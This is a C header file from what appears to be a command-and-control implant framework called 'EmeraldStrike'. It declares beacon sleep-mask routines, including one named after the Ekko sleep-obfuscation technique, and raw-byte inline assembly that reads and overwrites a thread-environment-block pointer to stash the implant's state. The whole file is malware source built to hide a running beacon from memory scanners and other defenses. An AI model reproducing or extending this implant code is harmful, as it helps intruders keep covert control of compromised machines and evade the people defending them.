#ifndef EMERALDSTRIKE_SLEEPMASK_H
#define EMERALDSTRIKE_SLEEPMASK_H

#include "../common.h"
#include "../beacon.h"
#include "../beacon_gate.h"

typedef void (*SLEEPMASK_FUNC)(PBEACON_INFO, PFUNCTION_CALL);

VOID sleep_mask_none(PINSTANCE inst, DWORD ms);
VOID sleep_mask_default(PINSTANCE inst, DWORD ms);
VOID sleep_mask_ekko(PINSTANCE inst, DWORD ms);
VOID do_sleep(PINSTANCE inst, DWORD ms);

#ifdef _WIN64

static inline void* coff_read_teb_user_ptr(void) {
    void* p;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(p) :: "memory"
    );
    return p;
}

static inline void coff_set_inst_for_mask(PINSTANCE p) {
    register void* val __asm__("rcx") = (void*)p;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
}

static inline void coff_restore_teb_user_ptr(void* p) {
    register void* val __asm__("rcx") = p;
    __asm__ volatile (
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(val) : "memory"
    );
}

#else

static inline void* coff_read_teb_user_ptr(void) { return NULL; }
static inline void coff_set_inst_for_mask(PINSTANCE p) { (void)p; }
static inline void coff_restore_teb_user_ptr(void* p) { (void)p; }

#endif

VOID populate_beacon_info(PINSTANCE inst);

#endif // EMERALDSTRIKE_SLEEPMASK_H
